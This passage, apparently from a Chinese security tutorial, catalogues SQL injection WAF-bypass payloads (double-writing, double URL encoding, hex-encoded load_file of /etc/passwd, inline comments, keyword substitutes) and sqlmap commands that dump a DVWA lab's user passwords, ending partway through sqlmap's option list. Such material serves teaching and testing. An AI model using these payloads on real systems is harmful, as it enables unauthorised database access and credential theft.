1,2,3,4#</code>，经过网站的过滤机制，服务器实际接收到的则是<code>1&#39; and 1=2 1,2,3,4#</code></p><p>此时可以双写绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fsec.com/index.php?page_id=1&#x27; UNIunionON SELselectECT 1,2,3,4#</span><br></pre></td></tr></table></figure><p>经过网站过滤机制，<code>UNIunionON SELselectECT</code>实际变成了<code>UNION SELECT</code>。但要注意，这只适用于网站防御机制只匹配一次、过滤一次的情况。如果网站正则具有循环匹配，循环过滤直至匹配不到的机制，那么这种绕过方法就不再适用了。</p><h3 id="2-3-编码绕过"><a href="#2-3-编码绕过" class="headerlink" title="2.3 编码绕过"></a>2.3 编码绕过</h3><p>如果网站防御机制未考虑过各类编码情况，那么将攻击语句编码后再发送也是一种很好的方法。</p><h4 id="2-3-1-URL编码"><a href="#2-3-1-URL编码" class="headerlink" title="2.3.1 URL编码"></a>2.3.1 URL编码</h4><p>通常来说，在浏览器输入URL时，浏览器会对一些字符进行URL 编码如，空格变为%20、单引号%27、左括号%28、右括号%29。而服务器收到后会对其进行解码。如果网站具备防御机制，则会对解码后的内容进行规则匹配。然而一些程序在执行了过滤之后还会执行一次不必要的解码，</p><p>比如我们输入带有url编码的字符串：</p><p><code>1%2527%20and%201%253d1%23</code>,这条字符在会被解码为：<code>1%27 and 1%3d1#</code>，其中没有<code>&#39;</code>和<code>=</code>，假设这样就不会触发某些防御规则，然而当waf放过这串字符后，网站程序又会执行一次不必要的解码，再次解码后文本变成如此：<code>1&#39; and 1=1#</code>，这一条将被数据库执行。</p><h4 id="2-3-2-十六进制编码"><a href="#2-3-2-十六进制编码" class="headerlink" title="2.3.2 十六进制编码"></a>2.3.2 十六进制编码</h4><p><a href="https://lzltool.com/hex">十六进制编码转换成文本字符串,base64,base64URL—LZL在线工具 (lzltool.com)</a></p><p>主要用于where语句后的<strong>引号</strong>问题，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=2 union select 1,table_name from information_schema.tables where table_schema= &#x27;dvwa&#x27;#</span><br><span class="line">1&#x27; and 1=2 union select 1,table_name from information_schema.tables where table_schema= 0x64767761#</span><br></pre></td></tr></table></figure><p><img src="/img/20230618120621.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and 1=2 union select 1,load_file(&#x27;/etc/passwd&#x27;);#</span><br><span class="line">1 and 1=2 union select 1,load_file(0x2F6574632F706173737764);#</span><br></pre></td></tr></table></figure><p><img src="/img/20230618120904.png"></p><h4 id="2-3-3-char-函数"><a href="#2-3-3-char-函数" class="headerlink" title="2.3.3 char()函数"></a>2.3.3 char()函数</h4><p>MySQL <code>CHAR()</code> 函数将每个参数对应的整数转为对应的字符，并将这些字符组成一个字符串返回。</p><p><code>CHAR()</code> 语法</p><p>这里是 MySQL <code>CHAR()</code> 函数的语法：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="type">CHAR</span>(num1, [num2, ...])</span><br></pre></td></tr></table></figure><p><strong>参数</strong></p><ul><li><p><em><code>num1, [num2, ...]</code></em></p><p>必需的。一些整数，或者能转为整数的值。</p></li></ul><p><strong>返回值</strong></p><p><code>CHAR()</code> 函数返回一个字符串，其中的字符由每个整数参数对应的字符组成。</p><p>参数 <code>num1, [num2, ...]</code> 包含的 <code>NULL</code> 值将被 <code>CHAR()</code> 函数忽略。</p><p><code>CHAR()</code> 示例</p><p>这里列出了几个常见的 <code>CHAR()</code> 示例。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>),</span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;67&#x27;</span>),</span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65.4</span>, <span class="string">&#x27;66.5&#x27;</span>, <span class="string">&#x27;67.6&#x27;</span>),</span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65</span>, <span class="number">66</span>, <span class="keyword">NULL</span>, <span class="number">67</span>)\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">          <span class="type">CHAR</span>(<span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>): ABC</span><br><span class="line">      <span class="type">CHAR</span>(<span class="number">65</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;67&#x27;</span>): ABC</span><br><span class="line"><span class="type">CHAR</span>(<span class="number">65.4</span>, <span class="string">&#x27;66.5&#x27;</span>, <span class="string">&#x27;67.6&#x27;</span>): ABC</span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">65</span>, <span class="number">66</span>, <span class="keyword">NULL</span>, <span class="number">67</span>): ABC</span><br></pre></td></tr></table></figure><h3 id="2-4-注释绕过"><a href="#2-4-注释绕过" class="headerlink" title="2.4 注释绕过"></a>2.4 注释绕过</h3><h4 id="2-4-1-注释绕过针对空格的过滤"><a href="#2-4-1-注释绕过针对空格的过滤" class="headerlink" title="2.4.1 注释绕过针对空格的过滤"></a>2.4.1 注释绕过针对空格的过滤</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union/**/select 1,2 #</span></span><br></pre></td></tr></table></figure><p><img src="/img/20230618170424.png"></p><p><img src="/img/20230618170507.png"></p><h4 id="2-4-2-内联注入"><a href="#2-4-2-内联注入" class="headerlink" title="2.4.2 内联注入"></a>2.4.2 内联注入</h4><p><code>/*![数据库版本][数据库函数]*/</code>，和注释<code>/**/</code>的区别是多了一个感叹号，可选的数据库版本号。</p><p>这种注释在mysql中叫做内联注释，当实际的版本等于或是高于写入的[数据库版本]，应用程序就会将注释内容解释为SQL命令，否则就会当做注释来处理。默认情况下，不添加数据库版本也会当做SQL命令来执行。</p><p>内联注释可以用来包裹数据库关键字和非关键字。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 /*!UNION*/ /*!SELECT*/ 1,2#</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/*asdw*/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">/**/</span><span class="comment">/*!50000UNION*/</span><span class="comment">/*abcd*/</span><span class="comment">/*!50000SELECT*/</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>#</span><br></pre></td></tr></table></figure><p><img src="/img/20230618170544.png"></p><h3 id="2-5-等价语句替换"><a href="#2-5-等价语句替换" class="headerlink" title="2.5 等价语句替换"></a>2.5 等价语句替换</h3><p>在有些函数或命令因其关键字被检测出来而无法使用的情况下，我们可以考虑使用与之等价或类似的代码替代其使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep() 与 benchmark()</span><br><span class="line">concat_ws() 与 group_concat()</span><br><span class="line">mid()=substr()=substring()</span><br></pre></td></tr></table></figure><p>sleep()与benchmark()</p><p>mysql中可用BENCHMARK(50000000,MD5(‘A’))产生延迟，执行MD5()50000000次，产生的延迟时间和服务器性能有关。</p><p><img src="/img/20230618170610.png"></p><p>concat_ws() 与 group_concat()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(str1,str2,…) //没有分隔符得连接字符串,</span><br><span class="line">concat_ws(separator,str1,str2,…) //含有分隔符得连接字符串</span><br><span class="line">group_concat(str1,str2,…) //连接一个组的所有字符串，并以逗号分割每条数据</span><br></pre></td></tr></table></figure><p><img src="/img/20230618170642.png"></p><p><img src="/img/20230618170701.png"></p><h3 id="2-6-常见过滤字符及绕过"><a href="#2-6-常见过滤字符及绕过" class="headerlink" title="2.6 常见过滤字符及绕过"></a>2.6 常见过滤字符及绕过</h3><p>当空格被过滤后，可通过以下方法绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释代替空格</span><br><span class="line">select * from tb1 where name=&#x27;asd&#x27;;</span><br><span class="line">等价：</span><br><span class="line">select/**/*/**/from/**/tb1/**/where/**/name=&#x27;asd&#x27;;</span><br><span class="line"></span><br><span class="line">括号代替空格</span><br><span class="line">mysql中可用()来代替空格。可以用括号包裹非数据库关键字</span><br><span class="line">select name from tb1 where name =&#x27;asd&#x27;;</span><br><span class="line">等价：</span><br><span class="line">select(name)from(tb1)where(name)=(&#x27;asd&#x27;);</span><br><span class="line"></span><br><span class="line">引号代替空格</span><br><span class="line">mysql中可用单引号或双引号来代替空格。</span><br><span class="line">select name from tb1 where name =&#x27;asd&#x27; and 1=1;</span><br><span class="line">等价：</span><br><span class="line">select name from tb1 where name =&#x27;asd&#x27;and&#x27;1&#x27;=&#x27;1&#x27;;</span><br><span class="line"></span><br><span class="line">特殊字符代替空格</span><br><span class="line">如下特殊字符可代替空格：</span><br><span class="line">%09    水平定位符号%0a    换行符%0c    换页符%0d    回车%0b    垂直定位符号</span><br><span class="line"></span><br><span class="line">用Tab代替空格</span><br></pre></td></tr></table></figure><p>过滤union\select</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绕过示例：过滤代码 union select user,password from users</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users where userid=1)=&#x27;admin&#x27;</span><br><span class="line">十六进制字符绕过select ——&gt; selec\x74union——&gt;unio\x6e</span><br><span class="line">大小写绕过SelEct</span><br><span class="line">双写绕过selselectectuniunionon</span><br><span class="line">urlencode，ascii(char)，hex，unicode编码绕过关键字</span><br><span class="line">内联绕所有/*!union*//*!select*/</span><br></pre></td></tr></table></figure><p>过滤引号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可通过注释、括号、内联注释代替引号。</span><br><span class="line">字符串可写作0x十六进制。</span><br><span class="line">select * from tb1 where name=&#x27;asd&#x27;;</span><br><span class="line">等价</span><br><span class="line">select * from tb1 where name=0x617364;</span><br></pre></td></tr></table></figure><p>过滤&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; or 1 like 1#可以绕过对 = &gt; 等过滤</span><br><span class="line">or &#x27;1&#x27; IN (&#x27;1234&#x27;)#可以替代=</span><br></pre></td></tr></table></figure><p>过滤逗号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在使用mid，substr，substring函数的时候，如果逗号被过滤，可以通过from x for y代替。</span><br><span class="line">select mid(user(),1,2);                #从第一个字符开始截取2个</span><br><span class="line">等价</span><br><span class="line">select mid(user() from 1 for 2);    #从第一个字符开始截取2个</span><br></pre></td></tr></table></figure><p>过滤注释符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试中通常需要通过注释符屏蔽后面的语句，否则容易报错，但注释符被过滤了。</span><br><span class="line">例如：select * from tb1 where id=$_GET[‘id’] limit 1; //limit1是我们想要屏蔽的语句。</span><br><span class="line">1.通过;结束语句，如果系统不支持堆查询注入，那么后面语句不会执行，或者执行了也能屏蔽错误。</span><br><span class="line">select * from tb1 where id=1; limit 1;</span><br><span class="line">2.整数型注入不受影响</span><br><span class="line">select * from tb1 where id=1 or 1=1 limit 1;</span><br><span class="line">3.字符型注入,传入的参数前后被加上了引号，select * from tb1 where id=&#x27;$_GET[&#x27;id&#x27;]&#x27; limit 1; </span><br><span class="line">这时候可以传入1&#x27; or &#x27;1&#x27;=&#x27;1  ，再拼接上引号后就能完整。</span><br><span class="line">select * from tb1 where id=&#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; limit 1;</span><br></pre></td></tr></table></figure><p>过滤where</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users limit 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p>过滤limit</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; (select user from users limit 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;#user_id聚合中user_id为1的user为admin</span><br></pre></td></tr></table></figure><p>过滤group by</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;</span><br><span class="line">绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br></pre></td></tr></table></figure><p>过滤select</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br><span class="line">绕过方式 1 &amp;&amp; substr(user,1,1) = &#x27;a&#x27;</span><br></pre></td></tr></table></figure><p>过滤hex</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br><span class="line">绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br></pre></td></tr></table></figure><p>过滤substr</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">逻辑绕过过滤代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) </span><br><span class="line">绕过方式 1 &amp;&amp; lpad(user(),1,1) in &#x27;r&#x27;</span><br></pre></td></tr></table></figure><p>过滤and，or</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#等价关键字，在很多时候，当关键字被过滤后，可通过与其等价的其他关键字来绕过。</span><br><span class="line">等价and</span><br><span class="line">假如：select * from tb1 where id=1 and 1=1</span><br><span class="line">此时和and等价关键字有：like（1 like 1。like可跟通配符。），rlike（1 rlike 1 rlike可跟正则表达式。），regexp（1 regexp 1 regexp可跟正则表达式。），&amp;（1 &amp;&amp; 1 ，逻辑与），&amp;&amp;（1 &amp; 1，按位与，任意数&amp;0的值为0），与and的结果都是1.</span><br><span class="line"></span><br><span class="line">等价or</span><br><span class="line">假如：select * from tb1 where id=1 or 1=1;</span><br><span class="line">此时等价or的关键字有：||    （逻辑或），|    （按位或），任意数|0的值为任意数</span><br></pre></td></tr></table></figure><h1 id="14-sqlmap"><a href="#14-sqlmap" class="headerlink" title="14 sqlmap"></a>14 sqlmap</h1><h2 id="1-基本语句"><a href="#1-基本语句" class="headerlink" title="1 基本语句"></a>1 基本语句</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali：</span><br><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$url</span>&quot;</span> --dbs  <span class="comment">#注入这个URL，注入出库名。</span></span><br><span class="line">windows：</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;<span class="variable">$url</span>&quot;</span> --dbs</span><br></pre></td></tr></table></figure><p>以DVWA为例，由于DVWA需要登录，没有cookie是无法访问这个网站的。所以还需要指定cookie参数。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;<span class="variable">$url</span>&quot;</span> --cookie=<span class="string">&quot;<span class="variable">$cookie</span>&quot;</span>  --dbs</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.43.252/vulnerabilities/sqli/?id=12&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=iuefue0ve30qnodkna7j236e82; security=low; security_level=0&quot;</span> --dbs</span><br></pre></td></tr></table></figure><p>如果注入点所在是一个POST请求的网页，或者你不想指定cookie这样麻烦。也可以在burp中保存请求包为一个文件，再用sqlmap中的<code>-r</code></p><p>参数指定这个文件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt --dbs</span><br></pre></td></tr></table></figure><p><img src="/img/20220924090317.png"></p><h2 id="2-命令"><a href="#2-命令" class="headerlink" title="2 命令"></a>2 命令</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-u             <span class="comment">#指定url</span></span><br><span class="line">-r             <span class="comment">#指定文件</span></span><br><span class="line">-p             <span class="comment">#指定注入点</span></span><br><span class="line">--cookie       <span class="comment">#指定cookie</span></span><br><span class="line">--dbs          <span class="comment">#注入库名</span></span><br><span class="line">--D            <span class="comment">#指定库名</span></span><br><span class="line">--tables       <span class="comment">#注入表名</span></span><br><span class="line">-T             <span class="comment">#指定表名</span></span><br><span class="line">--columns      <span class="comment">#注入列名</span></span><br><span class="line">-C             <span class="comment">#指定列名</span></span><br><span class="line">--dump         <span class="comment">#注入数据</span></span><br><span class="line">--dbms         <span class="comment">#指定数据库类型</span></span><br></pre></td></tr></table></figure><p>继续以DVWA为例子，注入dvwa库下的表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D dvwa --tables</span><br></pre></td></tr></table></figure><p>注入dvwa库下，users表下的列名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D dvwa -T users --columns</span><br></pre></td></tr></table></figure><p>以url中的id为注入点，注入dvwa库下，users表下的password列的数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -p id -D dvwa -T users -C password --dump</span><br></pre></td></tr></table></figure><h2 id="全部命令"><a href="#全部命令" class="headerlink" title="全部命令"></a>全部命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            <span class="comment">#显示常用命令</span></span><br><span class="line">  -hh                   <span class="comment">#全部命令</span></span><br><span class="line">  --version             <span class="comment">#Show program&#x27;s version number and exit</span></span><br><span class="line">  -v VERBOSE            <span class="comment">#Verbosity level: 0-6 (default 1)</span></span><br><span class="line"></span><br><span class="line">  Target:</span><br><span class="line">    At least one of these options has to be provided to define the</span><br><span class="line">    target(s)</span><br><span class="line"></span><br><span class="line">    -u URL, --url=URL   Target URL (e.g. <span class="string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>)</span><br><span class="line">    -d DIRECT           Connection string <span class="keyword">for</span> direct database connection</span><br><span class="line">    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy <span class="built_in">log</span> file</span><br><span class="line">    -m BULKFILE         Scan multiple targets given <span class="keyword">in</span> a textual file</span><br><span class="line">    -r REQUESTFILE      Load HTTP request from a file</span><br><span class="line">    -g GOOGLEDORK       Process Google dork results as target URLs</span><br><span class="line">    -c CONFIGFILE       Load options from a configuration INI file</span><br><span class="line"></span><br><span class="line">  Request:</span><br><span class="line">    These options can be used to specify how to connect to the target URL</span><br><span class="line"></span><br><span class="line">    -A AGENT, --user..  HTTP User-Agent header value</span><br><span class="line">    -H HEADER, --hea..  Extra header (e.g. <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)</span><br><span class="line">    --method=METHOD     Force usage of given HTTP method (e.g. PUT)</span><br><span class="line">    --data=DATA         Data string to be sent through POST (e.g. <span class="string">&quot;id=1&quot;</span>)</span><br><span class="line">    --param-del=PARA..  Character used <span class="keyword">for</span> splitting parameter values (e.g. &amp;)</span><br><span class="line">    --cookie=COOKIE     HTTP Cookie header value (e.g. <span class="string">&quot;PHPSESSID=a8d127e..&quot;</span>)</span><br><span class="line">    --cookie-del=COO..  Character used <span class="keyword">for</span> splitting cookie values (e.g. ;)</span><br><span class="line">    --live-cookies=L..  Live cookies file used <span class="keyword">for</span> loading up-to-date values</span><br><span class="line">    --load-cookies=L..  File containing cookies <span class="keyword">in</span> Netscape/wget format</span><br><span class="line">    --drop-set-cookie   Ignore Set-Cookie header from response</span><br><span class="line">    --mobile            Imitate smartphone through HTTP User-Agent header</span><br><span class="line">    --random-agent      Use randomly selected HTTP User-Agent header value</span><br><span class="line">    --host=HOST         HTTP Host header value</span><br><span class="line">    --referer=REFERER   HTTP Referer header value</span><br><span class="line">    --headers=HEADERS   Extra headers (e.g. <span class="string">&quot;Accept-Language: fr\nETag: 123&quot;</span>)</span><br><span class="line">    --auth-type=AUTH..  HTTP authentication <span class="built_in">type</span> (Basic, Digest, Bearer, ...)</span><br><span class="line">    --auth-cred=AUTH..  HTTP authentication credentials (name:password)</span><br><span class="line">    --auth-file=AUTH..  HTTP authentication PEM cert/private key file</span><br><span class="line">    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)</span><br><span class="line">    --ignore-proxy      Ignore system default proxy settings</span><br><span class="line">    --ignore-redirects  Ignore redirection attempts</span><br><span class="line">    --ignore-timeouts   Ignore connection timeouts</span><br><span class="line">    --proxy=PROXY       Use a proxy to connect to the target URL</span><br><span class="line">    --proxy-cred=PRO..  Proxy authentication credentials (name:password)</span><br><span class="line">    --proxy-file=PRO..  Load proxy list from a file</span><br><span class="line">    --proxy-freq=PRO..  Requests between change of proxy from a given list</span><br><span class="line">    --tor               Use Tor anonymity network</span><br><span class="line">    --tor-port=TORPORT  Set Tor proxy port other than default</span><br><span class="line">    --tor-type=TORTYPE  Set Tor proxy <span class="built_in">type</span> (HTTP, SOCKS4 or SOCKS5 (default))</span><br><span class="line">    --check-tor         Check to see <span class="keyword">if</span> Tor is used properly</span><br><span class="line">    --delay=DELAY       Delay <span class="keyword">in</span> seconds between each HTTP request</span><br><span class="line">    --<span class="built_in">timeout</span>=TIMEOUT   Seconds to <span class="built_in">wait</span> before <span class="built_in">timeout</span> connection (default 30)</span><br><span class="line">    --retries=RETRIES   Retries when the connection timeouts (default 3)</span><br><span class="line">    --retry-on=RETRYON  Retry request on regexp matching content (e.g. <span class="string">&quot;drop&quot;</span>)</span><br><span class="line">    --randomize=RPARAM  Randomly change value <span class="keyword">for</span> given parameter(s)</span><br><span class="line">    --safe-url=SAFEURL  URL address to visit frequently during testing</span><br><span class="line">    --safe-post=SAFE..  POST data to send to a safe URL</span><br><span class="line">    --safe-req=SAFER..  Load safe HTTP request from a file</span><br><span class="line">    --safe-freq=SAFE..  Regular requests between visits to a safe URL</span><br><span class="line">    --skip-urlencode    Skip URL encoding of payload data</span><br><span class="line">    --csrf-token=CSR..  Parameter used to hold anti-CSRF token</span><br><span class="line">    --csrf-url=CSRFURL  URL address to visit <span class="keyword">for</span> extraction of anti-CSRF token</span><br><span class="line">    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit</span><br><span class="line">    --csrf-retries=C..  Retries <span class="keyword">for</span> anti-CSRF token retrieval (default 0)</span><br><span class="line">    --force-ssl         Force usage of SSL/HTTPS</span><br><span class="line">    --chunked           Use HTTP chunked transfer encoded (POST) requests</span><br><span class="line">    --hpp               Use HTTP parameter pollution method</span><br><span class="line">    --<span class="built_in">eval</span>=EVALCODE     Evaluate provided Python code before the request (e.g.</span><br><span class="line">                        <span class="string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)</span><br><span class="line"></span><br><span class="line">  Optimization:</span><br><span class="line">    These options can be used to optimize the performance of sqlmap</span><br><span class="line"></span><br><span class="line">    -o                  Turn on all optimization switches</span><br><span class="line">    --predict-output    Predict common queries output</span><br><span class="line">    --keep-alive        Use persistent HTTP(s) connections</span><br><span class="line">    --null-connection   Retrieve page length without actual HTTP response body</span><br><span class="line">    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)</span><br><span class="line"></span><br><span class="line">  Injection:</span><br><span class="line">    These options can be used to specify <span class="built_in">which</span> parameters to <span class="built_in">test</span> <span class="keyword">for</span>,</span><br><span class="line">    provide custom injection payloads and optional tampering scripts</span><br><span class="line"></span><br><span class="line">    -p TESTPARAMETER    Testable parameter(s)</span><br><span class="line">    --skip=SKIP         Skip testing <span class="keyword">for</span> given parameter(s)</span><br><span class="line">    --skip-static       Skip testing parameters that not appear to be dynamic</span><br><span class="line">    --param-exclude=..  Regexp to exclude parameters from testing (e.g. <span class="string">&quot;ses&quot;</span>)</span><br><span class="line">    --param-filter=P..  Select testable parameter(s) by place (e.g. <span class="string">&quot;POST&quot;</span>)</span><br><span class="line">    --dbms=DBMS         Force back-end DBMS to provided value</span><br><span class="line">    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)</span><br><span class="line">    --os=OS             Force back-end DBMS operating system to provided value</span><br><span class="line">    --invalid-bignum    Use big numbers <span class="keyword">for</span> invalidating values</span><br><span class="line">    --invalid-logical   Use logical operations <span class="keyword">for</span> invalidating values</span><br><span class="line">    --invalid-string    Use random strings <span class="keyword">for</span> invalidating values</span><br><span class="line">    --no-cast           Turn off payload casting mechanism</span><br><span class="line">    --no-escape         Turn off string escaping mechanism</span><br><span class="line">    --prefix=PREFIX     Injection payload prefix string</span><br><span class="line">    --suffix=SUFFIX     Injection payload suffix string</span><br><span class="line">    --tamper=TAMPER     Use given script(s) <span class="keyword">for</span> tampering injection data</span><br><span class="line"></span><br><span class="line">  Detection:</span><br><span class="line">    These options can be used to customize the detection phase</span><br><span class="line"></span><br><span class="line">    --level=LEVEL       Level of tests to perform (1-5, default 1)</span><br><span class="line">    --risk=RISK         Risk of tests to perform (1-3, default 1)</span><br><span class="line">    --string=STRING     String to match when query is evaluated to True</span><br><span class="line">    --not-string=NOT..  String to match when query is evaluated to False</span><br><span class="line">    --regexp=REGEXP     Regexp to match when query is evaluated to True</span><br><span class="line">    --code=CODE         HTTP code to match when query is evaluated to True</span><br><span class="line">    --smart             Perform thorough tests only <span class="keyword">if</span> positive heuristic(s)</span><br><span class="line">    --text-only         Compare pages based only on the textual content</span><br><span class="line">    --titles            Compare pages based only on their titles</span><br><span class="line"></span><br><span class="line">  Techniques:</span><br><span class="line">    These options can be used to tweak testing of specific SQL injection</span><br><span class="line">    techniques</span><br><span class="line"></span><br><span class="line">    --technique=TECH..  SQL injection techniques to use (default <span class="string">&quot;BEUSTQ&quot;</span>)</span><br><span class="line">    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)</span><br><span class="line">    --union-cols=UCOLS  Range of columns to <span class="built_in">test</span> <span class="keyword">for</span> UNION query SQL injection</span><br><span class="line">    --union-char=UCHAR  Character to use <span class="keyword">for</span> bruteforcing number of columns</span><br><span class="line">    --union-from=UFROM  Table to use <span class="keyword">in</span> FROM part of UNION query SQL injection</span><br><span class="line">    --dns-domain=DNS..  Domain name used <span class="keyword">for</span> DNS exfiltration attack</span><br><span class="line">    --second-url=SEC..  Resulting page URL searched <span class="keyword">for</span> second-order response</span><br><span class="line">    --second-req=SEC..  Load second-order HTTP request from file</span><br><span class="line"></span><br><span class="line">  Fingerprint:</span><br><span class="line">    -f, --fingerprint   Perform an extensive DBMS version fingerprint</span><br><span class="line"></span><br><span class="line">  Enumeration:</span><br><span class="line">    These options can be used to enumerate the back-end database</span><br><span class="line">    management system information, structure and data contained <span class="keyword">in</span> the</span><br><span class="line">    tables</span><br><span class="line"></span><br><span class="line">    -a, --all           Retrieve everything</span><br><span class="line">    -b, --banner        Retrieve DBMS banner</span><br><span class="line">    --current-user      Retrieve DBMS current user</span><br><span class="line">    --current-db        Retrieve DBMS current database</span><br><span class="line">    --hostname          Retrieve DBMS server hostname</span><br><span class="line">    --is-dba            Detect <span class="keyword">if</span> the DBMS current user is DBA</span><br><span class="line">    --<span class="built_in">users</span>             Enumerate DBMS <span class="built_in">users</span></span><br><span class="line">    --passwords         Enumerate DBMS <span class="built_in">users</span> password hashes</span><br><span class="line">    --privileges        Enumerate DBMS <span class="built_in">users</span> privileges</span><br><span class="line">    --roles             Enumerate DBMS <span class="built_in">users</span> roles</span><br><span class="line">    --dbs               Enumerate DBMS databases</span><br><span class="line">    --tables            Enumerate DBMS database tables</span><br><span class="line">    --columns           Enumerate DBMS database table columns</span><br><span class="line">    --schema            Enumerate DBMS schema</span><br><span class="line">    --count             Retrieve number of entries <span class="keyword">for</span> table(s)</span><br><span class="line">    --dump              Dump DBMS database table entries</span><br><span class="line">    --dump-all          Dump all DBMS databases tables entries</span><br><span class="line">    --search            Search column(s), table(s) and/or database name(s)</span><br><span class="line">    --comments          Check <span class="keyword">for</span> DBMS comments during enumeration</span><br><span class="line">    --statements        Retrieve SQL statements being run on DBMS</span><br><span class="line">    -D DB               DBMS database to enumerate</span><br><span class="line">    -T TBL              DBMS database table(s) to enumerate</span><br><span class="line">    -C COL              DBMS database table column(s) to enumerate</span><br><span class="line">    -X EXCLUDE          DBMS database identifier(s) to not enumerate</span><br><span class="line">    -U USER             DBMS user to enumerate</span><br><span class="line">    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables</span><br><span class="line">    --pivot-column=P..  Pivot column name</span><br><span class="line">    --<span 